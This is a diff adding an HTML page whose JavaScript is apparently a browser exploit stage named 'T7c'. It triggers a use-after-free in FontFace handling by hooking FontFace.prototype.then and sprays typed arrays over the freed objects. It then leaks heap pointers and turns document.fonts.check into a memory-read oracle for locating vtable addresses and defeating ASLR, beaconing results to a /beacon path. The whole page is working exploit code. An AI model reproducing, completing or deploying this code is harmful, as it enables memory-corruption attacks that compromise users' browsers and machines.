@@ -1,0 +1,292 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7c</title></head>
+<body><pre id="O">T7c</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7c-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+      w[0x82]=3;
+      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
+      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+    put64(vb,0x20,0n);put32(vb,0x28,0);put32(vb,0x2C,0);
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        // count=0 means "covers all codepoints" — safe with NULL +0x20
+        var zi=-1;
+        for(var q=0;q<faces.length;q++){
+          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+          if(r===false){zi=q;break;}
+        }
+        bs('ZI='+zi);
+        if(zi<0){bs('NOORACLE');return;}
+
+        function setR(addr){for(var ir=0;ir<bufs.length;ir++)put64(bufs[ir][0],0x20,addr);}
+        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}
+
+        // Set +0x20 to valid address BEFORE enabling count=1
+        for(var ip=0;ip<bufs.length;ip++){
+          bufs[ip][0][0x82]=0;
+          put32(bufs[ip][0],0x38,0x1000);put32(bufs[ip][0],0x3C,0x2000);
+          put64(bufs[ip][0],0x20,L2);
+          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
+        }
+
+        bs('SCAN1');
+        var self=0n,n3=0;
+        var anchors=[(L1&~0xFFn),(L2&~0xFFn)];
+        for(var an=0;an<anchors.length&&!self;an++){
+          var cS=anchors[an]-0x400000n,cE=anchors[an]+0x400000n;
+          if(cS<0x10000n)cS=0x10000n;
+          for(var a=cS;a<cE&&!self;a+=128n){
+            setR(a+0x38n);n3++;
+            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+              self=a;bs('SELF='+hex(a));
+            }
+          }
+        }
+        bs('SCAN1-END-n='+n3);
+        if(!self){bs('NOSELF');}
+
+        function bsFrom(lo,hi){
+          if(chk(hi)!==true)return -1;
+          while(lo<hi){var mid=(lo+hi)>>>1;if(chk(mid)===true)hi=mid;else lo=mid+1;}
+          return lo;
+        }
+        function bsTo(fr,hi){
+          var lo=fr;
+          while(lo<hi){var mid=(lo+hi+1)>>>1;if(chk(mid)===true)lo=mid;else hi=mid-1;}
+          return lo;
+        }
+
+        // ============================================================
+        // PHASE A: Shifted oracle reads on L2+8 (the WPI pointer)
+        // V45 walk chain: readQ(L2+8) → WPI → VTABLE → VT0
+        // At L2+8+2: from = byte2 + byte3*256 + 0x100000 (for heap ptrs)
+        // At L2+8+3: from = byte3 + byte4*256 (should be 0x1000 for heap)
+        // ============================================================
+        bs('PH-A-L2');
+        var wpiAddr=L2+8n;
+
+        setR(wpiAddr+2n);
+        var wF2=bsFrom(0,0x10FFFF);
+        var wT2=-1;if(wF2>=0)wT2=bsTo(wF2,0x10FFFF);
+        bs('WPI-s2-from='+(wF2>=0?'0x'+wF2.toString(16):'-1')+'-to='+(wT2>=0?'0x'+wT2.toString(16):'-1'));
+
+        setR(wpiAddr+3n);
+        var wF3=bsFrom(0,0x10FFFF);
+        bs('WPI-s3-from='+(wF3>=0?'0x'+wF3.toString(16):'-1'));
+
+        // Also read L2+0 at shifts for context
+        setR(L2+2n);
+        var l2F2=bsFrom(0,0x10FFFF);
+        bs('L2v-s2-from='+(l2F2>=0?'0x'+l2F2.toString(16):'-1'));
+
+        setR(L2+3n);
+        var l2F3=bsFrom(0,0x10FFFF);
+        bs('L2v-s3-from='+(l2F3>=0?'0x'+l2F3.toString(16):'-1'));
+
+        // ============================================================
+        // PHASE B: If WPI bytes found, scan for full WPI address
+        // Known: bytes 2-7. Missing: bytes 0-1.
+        // Scan: 16-byte aligned candidates.
+        // Filter: at WPI_candidate+2, from should be in [0x80000, 0x8FFFF]
+        // (a text-segment vtable pointer at WPI+0)
+        // ============================================================
+        if(wF2>=0x100000&&wF2<=0x10FFFF&&wF3>=0){
+          var wByte2=wF2-0x100000;
+          var wByte3and4=wF3;
+          bs('PH-B-WPI-b2=0x'+wByte2.toString(16));
+          bs('PH-B-WPI-s3val=0x'+wByte3and4.toString(16));
+
+          // Reconstruct known WPI bytes: [??, ??, byte2_lo, byte2_hi, 0x10, 0x00, 0x00, 0x00]
+          // wByte2 = byte2 + byte3*256. byte2 = wByte2 & 0xFF. byte3 = (wByte2 >> 8) & 0xFF.
+          var wb2lo=wByte2&0xFF,wb2hi=(wByte2>>8)&0xFF;
+          // Expected byte4=0x10 from s3: wByte3and4 should contain byte3 + byte4*256
+          // byte3 = wb2hi (from s2). byte4*256 portion of s3: wByte3and4 - wb2hi should be byte4*256
+          var expectedS3=wb2hi+0x10*256;
+          bs('PH-B-s3-expected=0x'+expectedS3.toString(16)+'-got=0x'+wByte3and4.toString(16)+'-match='+(expectedS3===wByte3and4));
+
+          // Build partial WPI: bytes=[b0, b1, wb2lo, wb2hi, 0x10, 0, 0, 0]
+          // BigInt: b0@0 | b1@8 | wb2lo@16 | wb2hi@24 | 0x10@32
+          var wpiBase=(0x10n<<32n)|(BigInt(wb2hi)<<24n)|(BigInt(wb2lo)<<16n);
+          bs('PH-B-wpiBase='+hex(wpiBase));
+
+          // Scan 4096 candidates (16-byte aligned)
+          // T7b did 65536 VP checks in ~2s, so 70K calls here ≈ 1s
+          var vtHits=[];
+          var scanN=0;
+          for(var b1=0;b1<256&&vtHits.length<3;b1++){
+            for(var b0=0;b0<256;b0+=16){
+              var wpiCand=wpiBase|(BigInt(b1)<<8n)|BigInt(b0);
+              setR(wpiCand+2n);scanN++;
+              // Binary search for from across full range, check if text-seg
+              var vtFrom=bsFrom(0,0x10FFFF);
+              if(vtFrom<0x80000||vtFrom>0x8FFFF)continue;
+              // Cross-check at +3: byte3_vt + 0x08*256
+              setR(wpiCand+3n);
+              var vtF3=bsFrom(0,0x1FFF);
+              if(vtF3>=0x800&&vtF3<0x900){
+                vtHits.push({wpi:wpiCand,vtFrom:vtFrom,vtF3:vtF3});
+                bs('VT-HIT-wpi='+hex(wpiCand)+'-vtFrom=0x'+vtFrom.toString(16)+'-vtF3=0x'+vtF3.toString(16));
+              }
+            }
+          }
+          bs('PH-B-END-scanN='+scanN+'-hits='+vtHits.length);
+
+          // ============================================================
+          // PHASE C: If VT hit found, derive VTABLE partial address
+          // and attempt VT_DELTA validation
+          // ============================================================
+          if(vtHits.length>0){
+            var hit=vtHits[0];
+            // vtFrom at wpi+2: from = vt_byte2 + vt_byte3*256 + 0x80000
+            // vt_byte2_3 = vtFrom - 0x80000
+            var vtB23=hit.vtFrom-0x80000;
+            var vtB2=vtB23&0xFF,vtB3=(vtB23>>8)&0xFF;
+            // vtF3: from = vt_byte3 + 0x08*256 = vt_byte3 + 0x800
+            var vtB3_check=hit.vtF3-0x800;
+            bs('PH-C-vtB2=0x'+vtB2.toString(16)+'-vtB3=0x'+vtB3.toString(16)+'-vtB3chk=0x'+vtB3_check.toString(16));
+
+            // VTABLE partial: 0x08 00 [vtB3] [vtB2] XX XX (bytes 2-5 known, 0-1 unknown)
+            var vtPartial=(0x08n<<32n)|(BigInt(vtB3)<<16n)|(BigInt(vtB2)<<8n);
+            bs('PH-C-vtPartial='+hex(vtPartial));
+
+            // Now read VT0 (first vtable entry) at VTABLE
+            // Need full VTABLE address. Unknown bytes 0-1.
+            // VT0 is ALSO a text-segment pointer.
+            // VT_DELTA = VTABLE - VT0 = 0x1710B78
+            // If we know vtB2,vtB3 of VTABLE and vtB2,vtB3 of VT0:
+            // VTABLE_partial - VT0_partial should give VT_DELTA_partial
+            // (bytes 2-3 of delta, ignoring borrow from bytes 0-1)
+
+            // For validation without full addresses:
+            // VTABLE[2:3] - VT0[2:3] should approximate DELTA[2:3]
+            // DELTA = 0x1710B78. DELTA bytes: [78, 0B, 71, 01, 00, ...]
+            // DELTA[2:3] = [0x71, 0x01] → 0x0171
+
+            // But we need VT0's bytes 2-3. Can we read from VTABLE?
+            // VTABLE is in the TEXT segment → reads may OOM!
+            // V45 says "forgeRead dies at TEXT pages" but oracle reads
+            // might work since they don't allocate the bitmap.
+
+            // Let's try oracle read at VTABLE with unknown bytes 0-1.
+            // We know vtB2, vtB3. Try candidate vtable addresses.
+            // For 8-byte alignment in text: b0 is multiple of 8.
+            // 256/8 * 256 = 8192 candidates. Too many.
+
+            // Alternative: use VT_DELTA to PREDICT VT0 from VTABLE.
+            // VT0 = VTABLE - 0x1710B78.
+            // If we know VTABLE bytes 2-3: [vtB2, vtB3]
+            // VT0 bytes 2-3 = VTABLE[2:3] - DELTA[2:3] with borrow
+            // DELTA[0:1] = [0x78, 0x0B] = 0x0B78
+            // If VTABLE[0:1] >= 0x0B78: no borrow. VT0[2:3] = vtB23 - 0x0171
+            // If VTABLE[0:1] < 0x0B78: borrow. VT0[2:3] = vtB23 - 0x0172
+
+            // We can CHECK both by reading VT0_candidate at shift+2.
+            // Expected: VT0 is a text pointer → from at +2 should be in [0x80000, 0x8FFFF]
+            // AND specifically: from = vt0B2 + vt0B3*256 + 0x80000
+            // where vt0B2,vt0B3 = vtB2,vtB3 adjusted by delta
+
+            var deltaLow=0x0B78;
+            var deltaB23=0x0171;
+
+            // Case 1: no borrow
+            var vt0B23_a=vtB23-deltaB23;
+            // Case 2: borrow
+            var vt0B23_b=vtB23-deltaB23-1;
+
+            bs('PH-C-delta-check-vtB23=0x'+vtB23.toString(16));
+            bs('PH-C-vt0B23-noBorrow=0x'+(vt0B23_a>=0?vt0B23_a.toString(16):('neg')));
+            bs('PH-C-vt0B23-borrow=0x'+(vt0B23_b>=0?vt0B23_b.toString(16):('neg')));
+
+            // Expected from at VT0+2 (for text ptr): 0x80000 + vt0B23
+            if(vt0B23_a>=0){
+              var expectedVt0From_a=0x80000+vt0B23_a;
+              bs('PH-C-expectedVT0from-a=0x'+expectedVt0From_a.toString(16));
+            }
+            if(vt0B23_b>=0){
+              var expectedVt0From_b=0x80000+vt0B23_b;
+              bs('PH-C-expectedVT0from-b=0x'+expectedVt0From_b.toString(16));
+            }
+          }
+        }
+
+        // ============================================================
+        // PHASE D: Also try L1-based reads for comparison
+        // ============================================================
+        bs('PH-D');
+        setR(L1+2n);
+        var l1F2=bsFrom(0,0x10FFFF);
+        bs('L1-s2-from='+(l1F2>=0?'0x'+l1F2.toString(16):'-1'));
+
+        setR(L1+3n);
+        var l1F3=bsFrom(0,0x10FFFF);
+        bs('L1-s3-from='+(l1F3>=0?'0x'+l1F3.toString(16):'-1'));
+
+        // Restore oracle
+        put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);
+        setR(self+0x38n);
+
+        bs('DONE');
+        document.getElementById('O').textContent='T7c DONE';
+      },50);
+    },50);
+  },50);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
